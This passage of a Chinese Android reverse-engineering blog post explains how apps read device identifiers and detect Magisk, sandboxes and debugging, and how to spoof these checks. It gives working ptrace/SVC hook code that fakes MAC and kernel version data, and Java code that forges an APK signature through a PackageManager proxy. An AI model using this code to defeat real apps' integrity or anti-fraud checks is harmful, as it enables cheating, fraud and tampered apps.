class="type">word_t</span>) iov-&gt;iov_base, temp_hdr, iov-&gt;iov_len);</span><br><span class="line">                    <span class="comment">//LOGE(&quot;ptrace SC_recvmsg write_data sucess ! &quot;)</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//LOGE(&quot;ptrace SC_recvmsg hdr read  fail ! &quot;)</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//LOGE(&quot;ptrace SC_recvmsg iov read  fail ! &quot;)</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//LOGE(&quot;ptrace SC_recvmsg msg_ret read fail ! &quot;)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>处理svc-&gt;recvfrom:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">void NetlinkMacHandler::netlinkHandler_recv(Tracer *tracee) &#123;</span><br><span class="line">    ssize_t bytes_read = TEMP_FAILURE_RETRY(peek_reg(tracee, CURRENT, SYSARG_RESULT));</span><br><span class="line">    if (bytes_read &gt; 0) &#123;</span><br><span class="line">        //get org value </span><br><span class="line">        word_t buff = peek_reg(tracee, CURRENT, SYSARG_2);</span><br><span class="line">        if(buff == 0)&#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        //buff长度</span><br><span class="line">        auto size = (size_t) peek_reg(tracee, CURRENT, SYSARG_3);</span><br><span class="line">        if(size == 0)&#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        char tempBuff[size];</span><br><span class="line">        int readStr_ret = read_data(tracee, tempBuff, buff, size);</span><br><span class="line">        if (readStr_ret != 0) &#123;</span><br><span class="line">            LOGE(&quot;svc netlink handler read_string error  %s&quot;, strerror(errno))</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        auto *hdr = reinterpret_cast&lt;nlmsghdr *&gt;(tempBuff);</span><br><span class="line">        //netlink数据包结构体</span><br><span class="line">        NetlinkMacHandler::handler_mac_callback_svc(tracee,hdr, bytes_read);</span><br><span class="line">        //将数据写入覆盖掉原来的数据</span><br><span class="line">        write_data(tracee, buff, tempBuff, size);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://bbs.pediy.com/thread-271698.htm">Android netlink&amp;svc 获取 Mac方法深入分析</a></p><p><a href="https://bbs.pediy.com/thread-273160.htm">SVC的TraceHook沙箱的实现&amp;无痕Hook实现思路</a></p><h4 id="内核文件相关（重要）"><a href="#内核文件相关（重要）" class="headerlink" title="内核文件相关（重要）"></a>内核文件相关（重要）</h4><p>内核文件指的是系统的相关文件，很多大厂会直接通过<code>popen cat</code>或者直接<code>fopen</code>只读的方式去读取文件内容。核心的也就那几个。</p><p><strong>一般读取的时候都是直接svc openat 底层需要用到svc的IO重定向，如果这块不处理的话，基本没办法进行mock和修改 。</strong></p><h4 id="build-prop相关"><a href="#build-prop相关" class="headerlink" title="build.prop相关"></a>build.prop相关</h4><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;/system/build.prop&quot;</span><br><span class="line">&quot;/odm/etc/build.prop&quot;</span><br><span class="line">&quot;/product/build.prop&quot;</span><br><span class="line">&quot;/vendor/build.prop&quot;</span><br></pre></td></tr></table></figure></blockquote><p>主要就是这四个文件，在低版本这个文件可以直接去读，所以这个文件也需要在Mock value以后生成一份新的，作为备份。</p><p>生成新的值要和之前Mock的值是一样的，防止出现不相同的情况 。当对方如果使用了SVC读取这个文件的时候，通过SVC的IO重定向绕过读取。</p><h4 id="proc-sys-kernel-random-boot-id"><a href="#proc-sys-kernel-random-boot-id" class="headerlink" title="&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id"></a>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id</h4><p>这个ID重启或者刷机以后发生变化，很多大厂会读取这个值，这个值类似一个UUID，SVC读取这个值，然后将这个值保存到私有目录。</p><p>跟DRM ID 相比，好处就是不同App读取的值是一样的。一个设备指纹占比很重的值。</p><h4 id="proc-sys-kernel-random-uuid"><a href="#proc-sys-kernel-random-uuid" class="headerlink" title="&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;uuid"></a>&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;uuid</h4><p>同上</p><h4 id="sys-block-mmcblk0-device-cid"><a href="#sys-block-mmcblk0-device-cid" class="headerlink" title="&#x2F;sys&#x2F;block&#x2F;mmcblk0&#x2F;device&#x2F;cid"></a>&#x2F;sys&#x2F;block&#x2F;mmcblk0&#x2F;device&#x2F;cid</h4><p>同上</p><h4 id="sys-devices-soc0-serial-number"><a href="#sys-devices-soc0-serial-number" class="headerlink" title="&#x2F;sys&#x2F;devices&#x2F;soc0&#x2F;serial_number"></a>&#x2F;sys&#x2F;devices&#x2F;soc0&#x2F;serial_number</h4><p>同上</p><h4 id="proc-misc"><a href="#proc-misc" class="headerlink" title="&#x2F;proc&#x2F;misc"></a>&#x2F;proc&#x2F;misc</h4><p>同上</p><h4 id="proc-version"><a href="#proc-version" class="headerlink" title="&#x2F;proc&#x2F;version"></a>&#x2F;proc&#x2F;version</h4><p>这个是一个linux系统内核文件，里面记录了当前Linux系统版本的相关信息。里面的值类似如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eg. Linux version 3.18.31-perf-g9b0888a(builder@c3-miui-ota-bd96.bj)</span><br></pre></td></tr></table></figure><p>这个文件在android 11以上基本读不到了 ，但是在android 9是可以读到的 。但是android 11有没有什么代替方案呢？答案是有的，svc 调用uname 。 使用方式类似如下，uname也是一个命令行，还可以通过popen <code>uname -a</code>的方式去获取 （popen部分会介绍到）。这个函数在IOS上面也比较实用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">utsname</span> <span class="title">buff</span>;</span></span><br><span class="line">   <span class="type">int</span> i = uname(&amp;buff);</span><br><span class="line">   LOGE(<span class="string">&quot;uname sysname %s &quot;</span>, buff.sysname)</span><br><span class="line">   LOGE(<span class="string">&quot;uname nodename %s &quot;</span>, buff.nodename)</span><br><span class="line">   LOGE(<span class="string">&quot;uname release %s &quot;</span>, buff.release)</span><br><span class="line">   LOGE(<span class="string">&quot;uname version %s &quot;</span>, buff.version)</span><br><span class="line">   LOGE(<span class="string">&quot;uname machine %s &quot;</span>, buff.machine)</span><br><span class="line">   LOGE(<span class="string">&quot;uname domainname %s &quot;</span>, buff.domainname)</span><br></pre></td></tr></table></figure><p>通过这几项就可以拿到&#x2F;proc&#x2F;version 里面的所有信息，</p><p><strong>很多大厂会用&#x2F; popen uname -a &#x2F; svc uname函数 &#x2F; 和svc openat去读&#x2F;proc&#x2F;version以此判断获取的值是否准确，如果有一个对不上都会认为当前设备被修改。</strong></p><p>修改方式如下 ，一般只需要处理release和Version即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">handlerLinuxEnvInfo</span><span class="params">(Tracer* tracee)</span>&#123;</span><br><span class="line">    <span class="type">word_t</span> reg = peek_reg(tracee, ORIGINAL, SYSARG_1);</span><br><span class="line">    <span class="keyword">if</span>(reg == <span class="number">0</span>)&#123;</span><br><span class="line">        LOGI(<span class="string">&quot;svc after org peek_reg reg 1 == 0 &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> *buff = (<span class="keyword">struct</span> utsname *) alloca(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> utsname));</span><br><span class="line">    <span class="type">int</span> msg_ret = read_data(tracee,  buff, reg, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> utsname));</span><br><span class="line">    <span class="keyword">if</span> (msg_ret == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> mockLinuxRelease ;</span><br><span class="line">        getZhenxiRuntimeMMKV()-&gt;getString(LINUX_VERSION_RELEASE,mockLinuxRelease);</span><br><span class="line">        <span class="built_in">memcpy</span>(buff-&gt;release,mockLinuxRelease.c_str() ,SYS_NMLN);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> mockLinuxVersion ;</span><br><span class="line">        getZhenxiRuntimeMMKV()-&gt;getString(LINUX_VERSION_VERSION,mockLinuxVersion);</span><br><span class="line">        <span class="built_in">memcpy</span>(buff-&gt;version,mockLinuxVersion.c_str() ,SYS_NMLN);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//写入内存</span></span><br><span class="line">        <span class="type">int</span> ret = write_data(tracee, reg, buff, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> utsname));</span><br><span class="line">        <span class="keyword">if</span>(ret!=<span class="number">0</span>)&#123;</span><br><span class="line">            LOGE(<span class="string">&quot;linux info write data error %s &quot;</span>, strerror(errno));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        LOGE(<span class="string">&quot;read_data read data error %s &quot;</span>, strerror(errno));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="popen相关"><a href="#popen相关" class="headerlink" title="popen相关"></a>popen相关</h3><p><strong>注意1：</strong></p><p>因为popen底层走的是execve的这个命令行，是一个shell命令的入口，在64位So里面只要对svc的openat进行IO重定向，哪怕他执行的是execve 也可以进行IO重定向。<strong>因为64位execve 底层读取文件，走的也是openat</strong></p><p>举个例子:</p><p>当我执行<code>popen cat /sys/devices/soc0/serial_number</code>，如果<code>/sys/devices/soc0/serial_number</code>这个文件被svc openat重定向到<code>/sdcard/a</code>文件。最终<code>cat /sys/devices/soc0/serial_number</code>读取到的也是<code>/sdcard/a</code> ，而不是原始的&#x2F;sys&#x2F;devices&#x2F;soc0&#x2F;serial_number 。</p><p><strong>注意2：</strong></p><p>popen这个函数它本身会开启一条线程去执行shell ，因为execve本身就是开一条线程去执行。返回的是一个File 句柄，如果我直接Hook popen 修改他的返回结果，<strong>把返回结果替换成我自己的句柄</strong>，这样是不被允许的，因为Linux 特性 默认情况<strong>A线程的文件创建的文件 B线程无法读取</strong>，跨线程找不到文件句柄fd（解决也很简单，<strong>可以将文件设置成组内可读即可</strong>）</p><p><strong>那么有没有一种方案可以不修改文件权限实现修改返回内容的Mock呢？</strong></p><p>其实很简单，只需要把参数修改成 <code>cat 被修改的返回结果路径即可</code> ，这样他读取到的内容也是你修改过以后的。</p><blockquote><p>或者直接吧参数1 设置成“ ” ，这样他读取到的内容一定是null。</p></blockquote><h4 id="uname-a"><a href="#uname-a" class="headerlink" title="uname -a"></a>uname -a</h4><p>这个命令行在之前介绍过了，主要为了解决&#x2F;proc&#x2F;version 读取不到的问题。可以直接通过下面的方式去去获取Linux的一些版本信息。</p><p><strong>Mock:</strong></p><p>这个uname底层走的还是<code>svc uname</code>函数，所以修改的时候只需要在<strong>svc层面直接修改uname函数返回结果</strong>即可。</p><p>参考<code>native /proc/version</code> 修改。</p><h4 id="getprop"><a href="#getprop" class="headerlink" title="getprop"></a>getprop</h4><p>这个执行的内容返回的值和，adb shell 以后执行getprop 结果是一样的。输出的是当前手机全部的<code>Build</code>相关配置。</p><h5 id="Mock-7"><a href="#Mock-7" class="headerlink" title="Mock:"></a>Mock:</h5><p>Hook的话也很简单，直接Hook popen 提前生产一份已经Mock好的 ,生产的这个要和Java层Build mock的值是一样的 ，然后直接换成<code>cat 成你自己的文件即可</code> 。这块需要注意，就是 getprop 有三种模式。代码如下</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getprop ro.odm.build.id</span><br><span class="line">getprop | grep dalvik</span><br><span class="line">getprop</span><br></pre></td></tr></table></figure></blockquote><p>需要对这种过滤模式进行处理。</p><h4 id="内核相关文件的cat"><a href="#内核相关文件的cat" class="headerlink" title="内核相关文件的cat"></a>内核相关文件的cat</h4><p>之前在native层说的内核文件都可以通过popen去cat 。代码如下，修改的话直接<code>svc openat</code> io重定向就好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FILE *fp = popen(&quot;cat /sys/devices/soc0/serial_number&quot;, &quot;r&quot;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="ps-ef-ps"><a href="#ps-ef-ps" class="headerlink" title="ps -ef &amp; ps"></a>ps -ef &amp; ps</h4><p>这个文件是扫描当前进程的 ，可以用来做反调试检测，比如刚启动的时候去获取一下当前进程列表。</p><p><strong>就可以知道是否存在frida ，或者当前进程是否被ptrace  ，因为用ptrace调试的话是需要多开启一条调试线程的。</strong></p><h4 id="ip-a（重要）"><a href="#ip-a（重要）" class="headerlink" title="ip a（重要）"></a>ip a（重要）</h4><p>其实就是<code>ip addr</code></p><p>这个也是很核心的设备指纹，里面会获取当前手机的网卡信息，<code>whan0 wlan1 p2p0</code> 这些信息。这个底层走的也是<code>netlinker</code></p><p>所以在<code>netlinker</code>层直接修改拦截，他哪怕执行的命令行也是生效的 。返回的东西很多，可以自己尝试打印一下。很多大厂也会用这种方式去扫描你的网卡Mac地址 。</p><h4 id="ls-al-sdcard-Android-data"><a href="#ls-al-sdcard-Android-data" class="headerlink" title="ls -al &#x2F;sdcard&#x2F;Android&#x2F;data"></a>ls -al &#x2F;sdcard&#x2F;Android&#x2F;data</h4><p>扫描私有目录，返回私有目录的一些信息 。可以判断当前App是否存在其他App目录下，<strong>主要用于检测沙箱</strong>。</p><p>其实检测沙箱还有一个很好的办法，就是检测手机的进程信息 。如果当前App在自己正常情况启动，只会有一条线程。</p><p>但是如果放在VA沙盒内部的话，VA沙盒本身会启动一条线程，自己的App本身也会启动一条线程。所以线程数量就对不上。也可以认为作弊。代码参考如下，<strong>绕过的话也很简单 Hook readdir 当发现读取的是调试线程直接return null即可 。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Test::checkSandbox</span><span class="params">()</span> &#123;</span><br><span class="line">    DIR *pdr = opendir(<span class="string">&quot;/proc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pdr == nullptr) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dirent *read_ptr;</span><br><span class="line">    <span class="comment">//在app启动之前检测当前app所有的进程,判断是否存在和main不一样的进程</span></span><br><span class="line">    <span class="keyword">while</span> ((read_ptr = readdir(pdr)) != nullptr) &#123;</span><br><span class="line">        <span class="type">int</span> procpid = atoi(read_ptr-&gt;d_name);</span><br><span class="line">        LOG(INFO) &lt;&lt; <span class="string">&quot;find /proc/ child dir  &quot;</span> &lt;&lt; procpid;</span><br><span class="line">        <span class="comment">//打开成功&amp;&amp;发现一条不等于主进程id的pid</span></span><br><span class="line">        <span class="keyword">if</span> (procpid &amp;&amp; procpid != getpid()) &#123;</span><br><span class="line">            <span class="comment">//这个文件所属主线程</span></span><br><span class="line">            LOG(ERROR) &lt;&lt; <span class="string">&quot;&gt;&gt;&gt;&gt;&gt;  FIND OTHER THREAD SANDBOX &quot;</span> &lt;&lt; procpid;</span><br><span class="line">            closedir(pdr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(pdr);</span><br><span class="line">    LOG(ERROR) &lt;&lt; <span class="string">&quot;&gt;&gt;&gt;&gt;&gt; NOT FIND SANDBOX &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="popen扫描Magisk"><a href="#popen扫描Magisk" class="headerlink" title="popen扫描Magisk"></a>popen扫描Magisk</h4><p>这些命令都可以进行magisk的列表的扫描，判断当前线程是否存在magisk等关键字，都是很好的办法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popen(<span class="string">&quot;df | grep /sbin/.magisk&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;mount  | grep /sbin/.magisk&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">popen(<span class="string">&quot;ps | grep magisk&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure><p>修改的话也很简单，如果是ps 或者 df 直接生成一份不存在magisk关键字的文件，（还有一些痕迹关键字，比如xposed,edxp,riru这些都是常用的检测关键字）</p><p>mout直接 svc IO重定向绕过即可 </p><h4 id="popen-logcat"><a href="#popen-logcat" class="headerlink" title="popen logcat"></a>popen logcat</h4><p>有很多大厂，他当发现你设备信息异常的时候，会直接执行<code>popen logcat</code>直接扫描你当前手机的日志系统 </p><p>把<strong>异常的log都进行上报</strong>，用于石锤当前用户是否作弊 。所以这个也需要处理 。代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pfile = popen(<span class="string">&quot;/system/bin/logcat -b main -d -v threadtime -t 200 --pid 当前线程pid&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> (fgets(buf, <span class="keyword">sizeof</span>(buf), pfile)) &#123;</span><br><span class="line">    LOGE(<span class="string">&quot;logcat  -&gt; %s&quot;</span>, buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="APK签名："><a href="#APK签名：" class="headerlink" title="APK签名："></a>APK签名：</h2><p>目前主要的获取签名就两种办法</p><h3 id="Java-层直接-通过binder和-AMS-通讯获取真实签名信息。"><a href="#Java-层直接-通过binder和-AMS-通讯获取真实签名信息。" class="headerlink" title="Java 层直接 通过binder和 AMS 通讯获取真实签名信息。"></a>Java 层直接 通过binder和 AMS 通讯获取真实签名信息。</h3><p>直接和AMS通讯，获取最真实的签名信息</p><p>这么一来你不管你Hook pms里面的哪些方法也没啥用</p><h4 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h4><p>因为和AMS通讯需要用到Binder，Binder可以理解成“水管” ，他虽然和AMS直接进行通讯，但是还是要经过我们的水管，我们直接对这个水管处理即可 。</p><p>在通讯时候对水管进行拦截。在<code>BinderProxy-&gt;transact</code> 的方法里面进行拦截和替换签名信息即可</p><p>我们会使用到<code>PMS</code>，来获取apk的签名值 <a href="https://www.jianshu.com/p/c559852c4878">参考</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">getSignature</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">PackageInfo</span> <span class="variable">packageInfo</span> <span class="operator">=</span> getPackageManager().getPackageInfo(getPackageName(), PackageManager.GET_SIGNATURES);</span><br><span class="line">            Log.i(SHARK, <span class="string">&quot;len:&quot;</span>+packageInfo.signatures.length);</span><br><span class="line">            <span class="keyword">if</span> (packageInfo.signatures != <span class="literal">null</span>) &#123;</span><br><span class="line">                Log.i(SHARK, <span class="string">&quot;sig:&quot;</span>+packageInfo.signatures[<span class="number">0</span>].toCharsString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>我们要使用动态代理的方式替换掉这里的两个属性</strong></p><ul><li><strong>ActivityThread的静态变量sPackageManager</strong></li><li><strong>ApplicationPackageManager对象里面的mPM变量</strong></li></ul><h4 id="Hook-demp"><a href="#Hook-demp" class="headerlink" title="Hook demp"></a>Hook demp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">//ServiceManagerWraper.java</span><br><span class="line">package com.shark.hookpms;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">import android.content.Context;</span><br><span class="line">import android.content.pm.PackageManager;</span><br><span class="line">import android.util.Log;</span><br><span class="line"></span><br><span class="line">public class ServiceManagerWraper &#123;</span><br><span class="line"></span><br><span class="line">    public final static String SHARK = &quot;Shark&quot;;</span><br><span class="line"></span><br><span class="line">    public static void hookPMS(Context context, String signed, String appPkgName, int hashCode) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 获取全局的ActivityThread对象</span><br><span class="line">            Class&lt;?&gt; activityThreadClass = Class.forName(&quot;android.app.ActivityThread&quot;);</span><br><span class="line">            Method currentActivityThreadMethod =</span><br><span class="line">                    activityThreadClass.getDeclaredMethod(&quot;currentActivityThread&quot;);</span><br><span class="line">            Object currentActivityThread = currentActivityThreadMethod.invoke(null);</span><br><span class="line">            // 获取ActivityThread里面原始的sPackageManager</span><br><span class="line">            Field sPackageManagerField = activityThreadClass.getDeclaredField(&quot;sPackageManager&quot;);</span><br><span class="line">            sPackageManagerField.setAccessible(true);</span><br><span class="line">            Object sPackageManager = sPackageManagerField.get(currentActivityThread);</span><br><span class="line">            // 准备好代理对象, 用来替换原始的对象</span><br><span class="line">            Class&lt;?&gt; iPackageManagerInterface = Class.forName(&quot;android.content.pm.IPackageManager&quot;);</span><br><span class="line">            Object proxy = Proxy.newProxyInstance(</span><br><span class="line">                    iPackageManagerInterface.getClassLoader(),</span><br><span class="line">                    new Class&lt;?&gt;[]&#123;iPackageManagerInterface&#125;,</span><br><span class="line">                    new PmsHookBinderInvocationHandler(sPackageManager, signed, appPkgName, 0));</span><br><span class="line">            // 1. 替换掉ActivityThread里面的 sPackageManager 字段</span><br><span class="line">            sPackageManagerField.set(currentActivityThread, proxy);</span><br><span class="line">            // 2. 替换 ApplicationPackageManager里面的 mPM对象</span><br><span class="line">            PackageManager pm = context.getPackageManager();</span><br><span class="line">            Field mPmField = pm.getClass().getDeclaredField(&quot;mPM&quot;);</span><br><span class="line">            mPmField.setAccessible(true);</span><br><span class="line">            mPmField.set(pm, proxy);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Log.d(SHARK, &quot;hook pms error:&quot; + Log.getStackTraceString(e));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void hookPMS(Context context) &#123;</span><br><span class="line">        String qqSign = &quot;30820253308201bca00302010202044bbb0361300d06092a864886f70d0101050500306d310e300c060355040613054368696e61310f300d06035504080c06e58c97e4baac310f300d06035504070c06e58c97e4baac310f300d060355040a0c06e885bee8aeaf311b3019060355040b0c12e697a0e7babfe4b89ae58aa1e7b3bbe7bb9f310b30090603550403130251513020170d3130303430363039343831375a180f32323834303132303039343831375a306d310e300c060355040613054368696e61310f300d06035504080c06e58c97e4baac310f300d06035504070c06e58c97e4baac310f300d060355040a0c06e885bee8aeaf311b3019060355040b0c12e697a0e7babfe4b89ae58aa1e7b3bbe7bb9f310b300906035504031302515130819f300d06092a864886f70d010101050003818d0030818902818100a15e9756216f694c5915e0b529095254367c4e64faeff07ae13488d946615a58ddc31a415f717d019edc6d30b9603d3e2a7b3de0ab7e0cf52dfee39373bc472fa997027d798d59f81d525a69ecf156e885fd1e2790924386b2230cc90e3b7adc95603ddcf4c40bdc72f22db0f216a99c371d3bf89cba6578c60699e8a0d536950203010001300d06092a864886f70d01010505000381810094a9b80e80691645dd42d6611775a855f71bcd4d77cb60a8e29404035a5e00b21bcc5d4a562482126bd91b6b0e50709377ceb9ef8c2efd12cc8b16afd9a159f350bb270b14204ff065d843832720702e28b41491fbc3a205f5f2f42526d67f17614d8a974de6487b2c866efede3b4e49a0f916baa3c1336fd2ee1b1629652049&quot;;</span><br><span class="line">        hookPMS(context, qqSign, &quot;com.shark.hookpms&quot;, 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">//PmsHookBinderInvocationHandler.java</span><br><span class="line">package com.shark.hookpms;</span><br><span class="line"></span><br><span class="line">import android.content.pm.PackageInfo;</span><br><span class="line">import android.content.pm.PackageManager;</span><br><span class="line">import android.content.pm.Signature;</span><br><span class="line">import android.util.Log;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class PmsHookBinderInvocationHandler implements InvocationHandler &#123;</span><br><span class="line">    private Object base;</span><br><span class="line"></span><br><span class="line">    public final static String SHARK = &quot;Shark&quot;;</span><br><span class="line"></span><br><span class="line">    //应用正确的签名信息</span><br><span class="line">    private String SIGN;</span><br><span class="line">    private String appPkgName = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public PmsHookBinderInvocationHandler(Object base, String sign, String 